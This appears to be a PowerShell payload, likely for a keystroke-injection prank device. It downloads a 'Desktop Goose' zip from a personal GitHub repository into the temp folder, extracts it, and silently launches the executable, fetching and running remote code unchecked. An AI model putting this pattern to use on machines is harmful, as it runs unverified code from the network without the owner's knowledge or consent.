$D="$env:tmp"
$zip="$D\DesktopGoose.zip"
iwr 'https://raw.githubusercontent.com/Thomaster1333/Duck/main/Desktop%20Goose%20v0.31.zip' -OutFile $zip
Expand-Archive $zip -DestinationPath "$D\DesktopGoose" -Force
$exe = Get-ChildItem "$D\DesktopGoose" -Recurse -Filter GooseDesktop.exe
if($exe){ Start-Process $exe[0].FullName }